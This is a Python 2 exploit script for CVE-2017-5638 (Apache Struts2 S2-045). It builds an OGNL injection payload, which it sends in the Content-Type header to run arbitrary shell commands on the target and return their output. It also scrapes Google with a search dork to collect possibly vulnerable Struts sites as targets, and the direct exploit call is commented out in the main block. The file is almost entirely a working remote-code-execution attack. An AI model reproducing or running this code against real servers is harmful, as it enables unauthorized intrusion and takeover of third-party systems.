#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import requests
import urllib2
import httplib


ls = []


def findUrl():
    res = requests.get("https://www.google.com.tw/search?q=intitle:%22Struts+Problem+Report%22+intext:%22development+mode+is+enabled.%22&ei=2sAWWfeJIIP98gWTpqHoDw&start=20&sa=N&biw=1440&bih=839")
    for item in res.text.split("</cite>"):
        if "<cite>" in item:
            ls.append(item [ item.find("<cite>")+len("<cite>") : ])


def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    findUrl()
    for i in ls:
        print(i)
    # if len(sys.argv) != 3:
        # print("[*] struts2_S2-045.py <url> <cmd>")
    # else:
        # print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        # url = sys.argv[1]
        # cmd = sys.argv[2]
        # print("[*] cmd: %s\n" % cmd)
        # exploit(url, cmd)
